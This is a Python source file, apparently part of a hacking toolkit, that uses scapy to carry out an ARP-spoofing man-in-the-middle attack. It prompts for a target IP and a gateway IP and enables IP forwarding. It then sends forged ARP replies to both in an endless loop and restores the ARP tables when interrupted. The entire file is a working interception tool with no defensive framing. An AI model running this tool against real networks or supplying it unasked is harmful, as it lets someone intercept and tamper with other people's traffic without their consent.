from scapy.all import Ether, ARP, srp, send
import time
import os
from appearance.hue import *
import sys

def get_mac(ip):
    mac, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=3, verbose=0)
    if mac:
        return mac[0][1].src

def arp_spoof(target_ip, host_ip):
    target_mac = get_mac(target_ip)
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at')
    send(arp_response, verbose=0)
    self_mac = ARP().hwsrc

def restore_arp(target_ip, host_ip):
    target_mac = get_mac(target_ip)
    host_mac = get_mac(host_ip)
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac)
    send(arp_response, verbose=0, count=6)
    print(run("Restoring " + target_ip))


def run_arp_spoof():
    print (info("Target IP to spoof - eg. 192.168.0.6"))
    target = raw_input(que("Target IP: "))
    print (info("Host is usually the router IP/gateway - eg. 192.168.0.1"))
    host = raw_input(que("Host/Gateway IP: "))
    print(run("Enabling IP Routing..."))
    with open("/proc/sys/net/ipv4/ip_forward", "w+") as ip_file:
        if ip_file.read() == 1:
            print(good("IP Routing enabled"))
        else:
            ip_file.write("1")
            print(good("IP Routing enabled"))
    try:
        #print info("Running ARP Spoofer against " + target + " as " + host)
        print (run("Running ARP Spoof against " + target))
        while True:
            arp_spoof(target, host)
            arp_spoof(host, target)
            time.sleep(0.3)
    except KeyboardInterrupt:
        print(run("Restoring the network..."))
        restore_arp(target, host)
        restore_arp(host, target)
        print(good("Done"))
